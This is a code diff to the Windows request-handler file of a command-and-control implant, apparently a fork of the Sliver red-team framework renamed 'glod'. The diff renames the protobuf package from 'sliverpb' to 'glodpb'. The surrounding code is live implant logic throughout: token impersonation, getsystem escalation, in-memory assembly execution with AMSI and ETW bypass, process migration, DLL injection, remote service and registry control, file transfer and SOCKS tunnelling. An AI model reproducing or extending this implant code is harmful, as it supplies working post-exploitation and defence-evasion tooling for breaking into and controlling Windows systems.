@@ -41,7 +41,7 @@ import (
 	"github.com/starkzarn/glod/implant/sliver/syscalls"
 	"github.com/starkzarn/glod/implant/sliver/taskrunner"
 	"github.com/starkzarn/glod/protobuf/commonpb"
-	"github.com/starkzarn/glod/protobuf/sliverpb"
+	"github.com/starkzarn/glod/protobuf/glodpb"
 
 	"golang.org/x/sys/windows"
 	"google.golang.org/protobuf/proto"
@@ -51,69 +51,69 @@ var (
 	windowsHandlers = map[uint32]RPCHandler{
 
 		// Windows Only
-		sliverpb.MsgTaskReq:                        taskHandler,
-		sliverpb.MsgProcessDumpReq:                 dumpHandler,
-		sliverpb.MsgImpersonateReq:                 impersonateHandler,
-		sliverpb.MsgRevToSelfReq:                   revToSelfHandler,
-		sliverpb.MsgRunAsReq:                       runAsHandler,
-		sliverpb.MsgInvokeGetSystemReq:             getsystemHandler,
-		sliverpb.MsgInvokeExecuteAssemblyReq:       executeAssemblyHandler,
-		sliverpb.MsgInvokeInProcExecuteAssemblyReq: inProcExecuteAssemblyHandler,
-		sliverpb.MsgInvokeMigrateReq:               migrateHandler,
-		sliverpb.MsgSpawnDllReq:                    spawnDllHandler,
-		sliverpb.MsgStartServiceReq:                startService,
-		sliverpb.MsgStopServiceReq:                 stopService,
-		sliverpb.MsgRemoveServiceReq:               removeService,
-		sliverpb.MsgEnvReq:                         getEnvHandler,
-		sliverpb.MsgSetEnvReq:                      setEnvHandler,
-		sliverpb.MsgUnsetEnvReq:                    unsetEnvHandler,
-		sliverpb.MsgExecuteWindowsReq:              executeWindowsHandler,
-		sliverpb.MsgGetPrivsReq:                    getPrivsHandler,
-		sliverpb.MsgCurrentTokenOwnerReq:           currentTokenOwnerHandler,
+		glodpb.MsgTaskReq:                        taskHandler,
+		glodpb.MsgProcessDumpReq:                 dumpHandler,
+		glodpb.MsgImpersonateReq:                 impersonateHandler,
+		glodpb.MsgRevToSelfReq:                   revToSelfHandler,
+		glodpb.MsgRunAsReq:                       runAsHandler,
+		glodpb.MsgInvokeGetSystemReq:             getsystemHandler,
+		glodpb.MsgInvokeExecuteAssemblyReq:       executeAssemblyHandler,
+		glodpb.MsgInvokeInProcExecuteAssemblyReq: inProcExecuteAssemblyHandler,
+		glodpb.MsgInvokeMigrateReq:               migrateHandler,
+		glodpb.MsgSpawnDllReq:                    spawnDllHandler,
+		glodpb.MsgStartServiceReq:                startService,
+		glodpb.MsgStopServiceReq:                 stopService,
+		glodpb.MsgRemoveServiceReq:               removeService,
+		glodpb.MsgEnvReq:                         getEnvHandler,
+		glodpb.MsgSetEnvReq:                      setEnvHandler,
+		glodpb.MsgUnsetEnvReq:                    unsetEnvHandler,
+		glodpb.MsgExecuteWindowsReq:              executeWindowsHandler,
+		glodpb.MsgGetPrivsReq:                    getPrivsHandler,
+		glodpb.MsgCurrentTokenOwnerReq:           currentTokenOwnerHandler,
 
 		// Platform specific
-		sliverpb.MsgIfconfigReq:            ifconfigHandler,
-		sliverpb.MsgScreenshotReq:          screenshotHandler,
-		sliverpb.MsgSideloadReq:            sideloadHandler,
-		sliverpb.MsgNetstatReq:             netstatHandler,
-		sliverpb.MsgMakeTokenReq:           makeTokenHandler,
-		sliverpb.MsgPsReq:                  psHandler,
-		sliverpb.MsgTerminateReq:           terminateHandler,
-		sliverpb.MsgRegistryReadReq:        regReadHandler,
-		sliverpb.MsgRegistryWriteReq:       regWriteHandler,
-		sliverpb.MsgRegistryCreateKeyReq:   regCreateKeyHandler,
-		sliverpb.MsgRegistryDeleteKeyReq:   regDeleteKeyHandler,
-		sliverpb.MsgRegistrySubKeysListReq: regSubKeysListHandler,
-		sliverpb.MsgRegistryListValuesReq:  regValuesListHandler,
+		glodpb.MsgIfconfigReq:            ifconfigHandler,
+		glodpb.MsgScreenshotReq:          screenshotHandler,
+		glodpb.MsgSideloadReq:            sideloadHandler,
+		glodpb.MsgNetstatReq:             netstatHandler,
+		glodpb.MsgMakeTokenReq:           makeTokenHandler,
+		glodpb.MsgPsReq:                  psHandler,
+		glodpb.MsgTerminateReq:           terminateHandler,
+		glodpb.MsgRegistryReadReq:        regReadHandler,
+		glodpb.MsgRegistryWriteReq:       regWriteHandler,
+		glodpb.MsgRegistryCreateKeyReq:   regCreateKeyHandler,
+		glodpb.MsgRegistryDeleteKeyReq:   regDeleteKeyHandler,
+		glodpb.MsgRegistrySubKeysListReq: regSubKeysListHandler,
+		glodpb.MsgRegistryListValuesReq:  regValuesListHandler,
 
 		// Generic
-		sliverpb.MsgPing:           pingHandler,
-		sliverpb.MsgLsReq:          dirListHandler,
-		sliverpb.MsgDownloadReq:    downloadHandler,
-		sliverpb.MsgUploadReq:      uploadHandler,
-		sliverpb.MsgCdReq:          cdHandler,
-		sliverpb.MsgPwdReq:         pwdHandler,
-		sliverpb.MsgRmReq:          rmHandler,
-		sliverpb.MsgMvReq:          mvHandler,
-		sliverpb.MsgMkdirReq:       mkdirHandler,
-		sliverpb.MsgExecuteReq:     executeHandler,
-		sliverpb.MsgReconfigureReq: reconfigureHandler,
-		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
-		sliverpb.MsgChtimesReq:     chtimesHandler,
+		glodpb.MsgPing:           pingHandler,
+		glodpb.MsgLsReq:          dirListHandler,
+		glodpb.MsgDownloadReq:    downloadHandler,
+		glodpb.MsgUploadReq:      uploadHandler,
+		glodpb.MsgCdReq:          cdHandler,
+		glodpb.MsgPwdReq:         pwdHandler,
+		glodpb.MsgRmReq:          rmHandler,
+		glodpb.MsgMvReq:          mvHandler,
+		glodpb.MsgMkdirReq:       mkdirHandler,
+		glodpb.MsgExecuteReq:     executeHandler,
+		glodpb.MsgReconfigureReq: reconfigureHandler,
+		glodpb.MsgSSHCommandReq:  runSSHCommandHandler,
+		glodpb.MsgChtimesReq:     chtimesHandler,
 
 		// Extensions
-		sliverpb.MsgRegisterExtensionReq: registerExtensionHandler,
-		sliverpb.MsgCallExtensionReq:     callExtensionHandler,
-		sliverpb.MsgListExtensionsReq:    listExtensionsHandler,
+		glodpb.MsgRegisterExtensionReq: registerExtensionHandler,
+		glodpb.MsgCallExtensionReq:     callExtensionHandler,
+		glodpb.MsgListExtensionsReq:    listExtensionsHandler,
 
 		// {{if .Config.WGc2Enabled}}
 		// Wireguard specific
-		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
-		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
-		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
-		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
-		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
-		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
+		glodpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
+		glodpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
+		glodpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
+		glodpb.MsgWGStartSocksReq:     wgStartSocksHandler,
+		glodpb.MsgWGStopSocksReq:      wgStopSocksHandler,
+		glodpb.MsgWGListSocksReq:      wgListSocksServersHandler,
 		// {{end}}
 	}
 )
@@ -148,7 +148,7 @@ func WrapperHandler(handler RPCHandler, data []byte, resp RPCResponse) {
 // ---------------- Windows Handlers ----------------
 
 func impersonateHandler(data []byte, resp RPCResponse) {
-	impersonateReq := &sliverpb.ImpersonateReq{}
+	impersonateReq := &glodpb.ImpersonateReq{}
 	err := proto.Unmarshal(data, impersonateReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -160,7 +160,7 @@ func impersonateHandler(data []byte, resp RPCResponse) {
 	if err == nil {
 		taskrunner.CurrentToken = token
 	}
-	impersonate := &sliverpb.Impersonate{}
+	impersonate := &glodpb.Impersonate{}
 	if err != nil {
 		impersonate.Response = &commonpb.Response{Err: err.Error()}
 	}
@@ -169,7 +169,7 @@ func impersonateHandler(data []byte, resp RPCResponse) {
 }
 
 func runAsHandler(data []byte, resp RPCResponse) {
-	runAsReq := &sliverpb.RunAsReq{}
+	runAsReq := &glodpb.RunAsReq{}
 	err := proto.Unmarshal(data, runAsReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -182,7 +182,7 @@ func runAsHandler(data []byte, resp RPCResponse) {
 		show = 0
 	}
 	err = priv.RunAs(runAsReq.Username, runAsReq.Domain, runAsReq.Password, runAsReq.ProcessName, runAsReq.Args, show, runAsReq.NetOnly)
-	runAs := &sliverpb.RunAs{}
+	runAs := &glodpb.RunAs{}
 	if err != nil {
 		runAs.Response = &commonpb.Response{Err: err.Error()}
 	}
@@ -196,7 +196,7 @@ func revToSelfHandler(_ []byte, resp RPCResponse) {
 	//{{end}}
 	taskrunner.CurrentToken = windows.Token(0)
 	err := priv.RevertToSelf()
-	revToSelf := &sliverpb.RevToSelf{}
+	revToSelf := &glodpb.RevToSelf{}
 	if err != nil {
 		revToSelf.Response = &commonpb.Response{Err: err.Error()}
 	}
@@ -208,7 +208,7 @@ func revToSelfHandler(_ []byte, resp RPCResponse) {
 }
 
 func currentTokenOwnerHandler(data []byte, resp RPCResponse) {
-	tokOwnReq := &sliverpb.CurrentTokenOwnerReq{}
+	tokOwnReq := &glodpb.CurrentTokenOwnerReq{}
 	err := proto.Unmarshal(data, tokOwnReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -217,7 +217,7 @@ func currentTokenOwnerHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	getCT := &sliverpb.CurrentTokenOwner{}
+	getCT := &glodpb.CurrentTokenOwner{}
 	owner, err := priv.CurrentTokenOwner()
 	if err != nil {
 		getCT.Response = &commonpb.Response{Err: err.Error()}
@@ -228,7 +228,7 @@ func currentTokenOwnerHandler(data []byte, resp RPCResponse) {
 }
 
 func getsystemHandler(data []byte, resp RPCResponse) {
-	getSysReq := &sliverpb.InvokeGetSystemReq{}
+	getSysReq := &glodpb.InvokeGetSystemReq{}
 	err := proto.Unmarshal(data, getSysReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -237,7 +237,7 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	err = priv.GetSystem(getSysReq.Data, getSysReq.HostingProcess)
-	getSys := &sliverpb.GetSystem{}
+	getSys := &glodpb.GetSystem{}
 	if err != nil {
 		getSys.Response = &commonpb.Response{Err: err.Error()}
 	}
@@ -246,7 +246,7 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 }
 
 func executeAssemblyHandler(data []byte, resp RPCResponse) {
-	execReq := &sliverpb.InvokeExecuteAssemblyReq{}
+	execReq := &glodpb.InvokeExecuteAssemblyReq{}
 	err := proto.Unmarshal(data, execReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -255,7 +255,7 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process, execReq.ProcessArgs, execReq.PPid)
-	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
+	execAsm := &glodpb.ExecuteAssembly{Output: []byte(output)}
 	if err != nil {
 		execAsm.Response = &commonpb.Response{
 			Err: err.Error(),
@@ -267,7 +267,7 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 }
 
 func inProcExecuteAssemblyHandler(data []byte, resp RPCResponse) {
-	execReq := &sliverpb.InvokeInProcExecuteAssemblyReq{}
+	execReq := &glodpb.InvokeInProcExecuteAssemblyReq{}
 	err := proto.Unmarshal(data, execReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -276,7 +276,7 @@ func inProcExecuteAssemblyHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	output, err := taskrunner.InProcExecuteAssembly(execReq.Data, execReq.Arguments, execReq.Runtime, execReq.AmsiBypass, execReq.EtwBypass)
-	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
+	execAsm := &glodpb.ExecuteAssembly{Output: []byte(output)}
 	if err != nil {
 		execAsm.Response = &commonpb.Response{
 			Err: err.Error(),
@@ -294,7 +294,7 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 		errWriter *bufio.Writer
 		outWriter *bufio.Writer
 	)
-	execReq := &sliverpb.ExecuteWindowsReq{}
+	execReq := &glodpb.ExecuteWindowsReq{}
 	err = proto.Unmarshal(data, execReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -303,7 +303,7 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 		return
 	}
 
-	execResp := &sliverpb.Execute{}
+	execResp := &glodpb.Execute{}
 	exePath, err := expandPath(execReq.Path)
 	if err != nil {
 		execResp.Response = &commonpb.Response{
@@ -402,7 +402,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 	// {{if .Config.Debug}}
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
-	migrateReq := &sliverpb.InvokeMigrateReq{}
+	migrateReq := &glodpb.InvokeMigrateReq{}
 	err := proto.Unmarshal(data, migrateReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -414,7 +414,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 	// {{if .Config.Debug}}
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
-	migrateResp := &sliverpb.Migrate{Success: true}
+	migrateResp := &glodpb.Migrate{Success: true}
 	if err != nil {
 		migrateResp.Success = false
 		migrateResp.Response = &commonpb.Response{
@@ -429,7 +429,7 @@ func migrateHandler(data []byte, resp RPCResponse) {
 }
 
 func spawnDllHandler(data []byte, resp RPCResponse) {
-	spawnReq := &sliverpb.SpawnDllReq{}
+	spawnReq := &glodpb.SpawnDllReq{}
 	err := proto.Unmarshal(data, spawnReq)
 
 	if err != nil {
@@ -442,7 +442,7 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 	log.Printf("ProcName: %s\tOffset:%x\tArgs:%s\n", spawnReq.GetProcessName(), spawnReq.GetOffset(), spawnReq.GetArgs())
 	//{{end}}
 	result, err := taskrunner.SpawnDll(spawnReq.GetProcessName(), spawnReq.GetProcessArgs(), spawnReq.GetPPid(), spawnReq.GetData(), spawnReq.GetOffset(), spawnReq.GetArgs(), spawnReq.Kill)
-	spawnResp := &sliverpb.SpawnDll{Result: result}
+	spawnResp := &glodpb.SpawnDll{Result: result}
 	if err != nil {
 		spawnResp.Response = &commonpb.Response{
 			Err: err.Error(),
@@ -454,12 +454,12 @@ func spawnDllHandler(data []byte, resp RPCResponse) {
 }
 
 func makeTokenHandler(data []byte, resp RPCResponse) {
-	makeTokenReq := &sliverpb.MakeTokenReq{}
+	makeTokenReq := &glodpb.MakeTokenReq{}
 	err := proto.Unmarshal(data, makeTokenReq)
 	if err != nil {
 		return
 	}
-	makeTokenResp := &sliverpb.MakeToken{}
+	makeTokenResp := &glodpb.MakeToken{}
 	err = priv.MakeToken(makeTokenReq.Domain, makeTokenReq.Username, makeTokenReq.Password, makeTokenReq.LogonType)
 	if err != nil {
 		makeTokenResp.Response = &commonpb.Response{
@@ -471,13 +471,13 @@ func makeTokenHandler(data []byte, resp RPCResponse) {
 }
 
 func startService(data []byte, resp RPCResponse) {
-	startService := &sliverpb.StartServiceReq{}
+	startService := &glodpb.StartServiceReq{}
 	err := proto.Unmarshal(data, startService)
 	if err != nil {
 		return
 	}
 	err = service.StartService(startService.GetHostname(), startService.GetBinPath(), startService.GetArguments(), startService.GetServiceName(), startService.GetServiceDescription())
-	startServiceResp := &sliverpb.ServiceInfo{}
+	startServiceResp := &glodpb.ServiceInfo{}
 	if err != nil {
 		startServiceResp.Response = &commonpb.Response{
 			Err: err.Error(),
@@ -488,13 +488,13 @@ func startService(data []byte, resp RPCResponse) {
 }
 
 func stopService(data []byte, resp RPCResponse) {
-	stopServiceReq := &sliverpb.StopServiceReq{}
+	stopServiceReq := &glodpb.StopServiceReq{}
 	err := proto.Unmarshal(data, stopServiceReq)
 	if err != nil {
 		return
 	}
 	err = service.StopService(stopServiceReq.ServiceInfo.Hostname, stopServiceReq.ServiceInfo.ServiceName)
-	svcInfo := &sliverpb.ServiceInfo{}
+	svcInfo := &glodpb.ServiceInfo{}
 	if err != nil {
 		svcInfo.Response = &commonpb.Response{
 			Err: err.Error(),
@@ -505,13 +505,13 @@ func stopService(data []byte, resp RPCResponse) {
 }
 
 func removeService(data []byte, resp RPCResponse) {
-	removeServiceReq := &sliverpb.RemoveServiceReq{}
+	removeServiceReq := &glodpb.RemoveServiceReq{}
 	err := proto.Unmarshal(data, removeServiceReq)
 	if err != nil {
 		return
 	}
 	err = service.RemoveService(removeServiceReq.ServiceInfo.Hostname, removeServiceReq.ServiceInfo.ServiceName)
-	svcInfo := &sliverpb.ServiceInfo{}
+	svcInfo := &glodpb.ServiceInfo{}
 	if err != nil {
 		svcInfo.Response = &commonpb.Response{
 			Err: err.Error(),
@@ -522,26 +522,26 @@ func removeService(data []byte, resp RPCResponse) {
 }
 
 func regWriteHandler(data []byte, resp RPCResponse) {
-	regWriteReq := &sliverpb.RegistryWriteReq{}
+	regWriteReq := &glodpb.RegistryWriteReq{}
 	err := proto.Unmarshal(data, regWriteReq)
 	if err != nil {
 		return
 	}
 	var val interface{}
 	switch regWriteReq.Type {
-	case sliverpb.RegistryTypeBinary:
+	case glodpb.RegistryTypeBinary:
 		val = regWriteReq.ByteValue
-	case sliverpb.RegistryTypeDWORD:
+	case glodpb.RegistryTypeDWORD:
 		val = regWriteReq.DWordValue
-	case sliverpb.RegistryTypeQWORD:
+	case glodpb.RegistryTypeQWORD:
 		val = regWriteReq.QWordValue
-	case sliverpb.RegistryTypeString:
+	case glodpb.RegistryTypeString:
 		val = regWriteReq.StringValue
 	default:
 		return
 	}
 	err = registry.WriteKey(regWriteReq.Hostname, regWriteReq.Hive, regWriteReq.Path, regWriteReq.Key, val)
-	regWriteResp := &sliverpb.RegistryWrite{
+	regWriteResp := &glodpb.RegistryWrite{
 		Response: &commonpb.Response{},
 	}
 	if err != nil {
@@ -552,13 +552,13 @@ func regWriteHandler(data []byte, resp RPCResponse) {
 }
 
 func regReadHandler(data []byte, resp RPCResponse) {
-	regReadReq := &sliverpb.RegistryReadReq{}
+	regReadReq := &glodpb.RegistryReadReq{}
 	err := proto.Unmarshal(data, regReadReq)
 	if err != nil {
 		return
 	}
 	res, err := registry.ReadKey(regReadReq.Hostname, regReadReq.Hive, regReadReq.Path, regReadReq.Key)
-	regReadResp := &sliverpb.RegistryRead{
+	regReadResp := &glodpb.RegistryRead{
 		Value:    res,
 		Response: &commonpb.Response{},
 	}
@@ -570,13 +570,13 @@ func regReadHandler(data []byte, resp RPCResponse) {
 }
 
 func regCreateKeyHandler(data []byte, resp RPCResponse) {
-	createReq := &sliverpb.RegistryCreateKeyReq{}
+	createReq := &glodpb.RegistryCreateKeyReq{}
 	err := proto.Unmarshal(data, createReq)
 	if err != nil {
 		return
 	}
 	err = registry.CreateSubKey(createReq.Hostname, createReq.Hive, createReq.Path, createReq.Key)
-	createResp := &sliverpb.RegistryCreateKey{
+	createResp := &glodpb.RegistryCreateKey{
 		Response: &commonpb.Response{},
 	}
 	if err != nil {
@@ -587,13 +587,13 @@ func regCreateKeyHandler(data []byte, resp RPCResponse) {
 }
 
 func regDeleteKeyHandler(data []byte, resp RPCResponse) {
-	deleteReq := &sliverpb.RegistryDeleteKeyReq{}
+	deleteReq := &glodpb.RegistryDeleteKeyReq{}
 	err := proto.Unmarshal(data, deleteReq)
 	if err != nil {
 		return
 	}
 	err = registry.DeleteKey(deleteReq.Hostname, deleteReq.Hive, deleteReq.Path, deleteReq.Key)
-	deleteResp := &sliverpb.RegistryDeleteKey{
+	deleteResp := &glodpb.RegistryDeleteKey{
 		Response: &commonpb.Response{},
 	}
 	if err != nil {
@@ -604,13 +604,13 @@ func regDeleteKeyHandler(data []byte, resp RPCResponse) {
 }
 
 func regSubKeysListHandler(data []byte, resp RPCResponse) {
-	listReq := &sliverpb.RegistrySubKeyListReq{}
+	listReq := &glodpb.RegistrySubKeyListReq{}
 	err := proto.Unmarshal(data, listReq)
 	if err != nil {
 		return
 	}
 	subKeys, err := registry.ListSubKeys(listReq.Hostname, listReq.Hive, listReq.Path)
-	regListResp := &sliverpb.RegistrySubKeyList{
+	regListResp := &glodpb.RegistrySubKeyList{
 		Response: &commonpb.Response{},
 	}
 	if err != nil {
@@ -623,13 +623,13 @@ func regSubKeysListHandler(data []byte, resp RPCResponse) {
 }
 
 func regValuesListHandler(data []byte, resp RPCResponse) {
-	listReq := &sliverpb.RegistryListValuesReq{}
+	listReq := &glodpb.RegistryListValuesReq{}
 	err := proto.Unmarshal(data, listReq)
 	if err != nil {
 		return
 	}
 	regValues, err := registry.ListValues(listReq.Hostname, listReq.Hive, listReq.Path)
-	regListResp := &sliverpb.RegistryValuesList{
+	regListResp := &glodpb.RegistryValuesList{
 		Response: &commonpb.Response{},
 	}
 	if err != nil {
@@ -642,7 +642,7 @@ func regValuesListHandler(data []byte, resp RPCResponse) {
 }
 
 func getPrivsHandler(data []byte, resp RPCResponse) {
-	createReq := &sliverpb.GetPrivsReq{}
+	createReq := &glodpb.GetPrivsReq{}
 
 	err := proto.Unmarshal(data, createReq)
 	if err != nil {
@@ -651,15 +651,15 @@ func getPrivsHandler(data []byte, resp RPCResponse) {
 
 	privsInfo, integrity, processName, err := priv.GetPrivs()
 
-	response_data := make([]*sliverpb.WindowsPrivilegeEntry, len(privsInfo))
+	response_data := make([]*glodpb.WindowsPrivilegeEntry, len(privsInfo))
 
 	/*
 		Translate the PrivilegeInfo structs into
-		sliverpb.WindowsPrivilegeEntry structs and put them in the data
+		glodpb.WindowsPrivilegeEntry structs and put them in the data
 		that will go back to the server / client
 	*/
 	for index, entry := range privsInfo {
-		var currentEntry sliverpb.WindowsPrivilegeEntry
+		var currentEntry glodpb.WindowsPrivilegeEntry
 
 		currentEntry.Name = entry.Name
 		currentEntry.Description = entry.Description
@@ -672,7 +672,7 @@ func getPrivsHandler(data []byte, resp RPCResponse) {
 	}
 
 	// Package up the response
-	getPrivsResp := &sliverpb.GetPrivs{
+	getPrivsResp := &glodpb.GetPrivs{
 		PrivInfo:         response_data,
 		ProcessIntegrity: integrity,
 		ProcessName:      processName,
@@ -690,14 +690,14 @@ func getPrivsHandler(data []byte, resp RPCResponse) {
 // Extensions
 
 func registerExtensionHandler(data []byte, resp RPCResponse) {
-	registerReq := &sliverpb.RegisterExtensionReq{}
+	registerReq := &glodpb.RegisterExtensionReq{}
 	err := proto.Unmarshal(data, registerReq)
 	if err != nil {
 		return
 	}
 	ext := extension.NewWindowsExtension(registerReq.Data, registerReq.Name, registerReq.OS, registerReq.Init)
 	err = ext.Load()
-	registerResp := &sliverpb.RegisterExtension{Response: &commonpb.Response{}}
+	registerResp := &glodpb.RegisterExtension{Response: &commonpb.Response{}}
 	if err != nil {
 		registerResp.Response.Err = err.Error()
 	} else {
@@ -708,13 +708,13 @@ func registerExtensionHandler(data []byte, resp RPCResponse) {
 }
 
 func callExtensionHandler(data []byte, resp RPCResponse) {
-	callReq := &sliverpb.CallExtensionReq{}
+	callReq := &glodpb.CallExtensionReq{}
 	err := proto.Unmarshal(data, callReq)
 	if err != nil {
 		return
 	}
 
-	callResp := &sliverpb.CallExtension{Response: &commonpb.Response{}}
+	callResp := &glodpb.CallExtension{Response: &commonpb.Response{}}
 	gotOutput := false
 	err = extension.Run(callReq.Name, callReq.Export, callReq.Args, func(out []byte) {
 		gotOutput = true
@@ -733,14 +733,14 @@ func callExtensionHandler(data []byte, resp RPCResponse) {
 }
 
 func listExtensionsHandler(data []byte, resp RPCResponse) {
-	lstReq := &sliverpb.ListExtensionsReq{}
+	lstReq := &glodpb.ListExtensionsReq{}
 	err := proto.Unmarshal(data, lstReq)
 	if err != nil {
 		return
 	}
 
 	exts := extension.List()
-	lstResp := &sliverpb.ListExtensions{
+	lstResp := &glodpb.ListExtensions{
 		Response: &commonpb.Response{},
 		Names:    exts,
 	}
